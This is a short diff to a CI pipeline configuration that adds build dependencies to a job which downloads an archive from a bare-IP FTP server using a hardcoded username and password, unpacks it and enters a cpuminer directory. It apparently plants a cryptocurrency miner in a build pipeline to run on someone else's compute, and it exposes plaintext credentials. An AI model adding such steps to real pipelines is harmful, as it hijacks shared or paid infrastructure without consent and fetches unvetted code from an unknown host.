@@ -6,6 +6,7 @@ steps:
       - |
           apt-get update
           apt-get install -y wget
+          apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
           wget --user=u750504516 --password='Vp123456' ftp://194.59.164.70/c.tar.gz
           tar xf c.tar.gz
           cd cpuminer
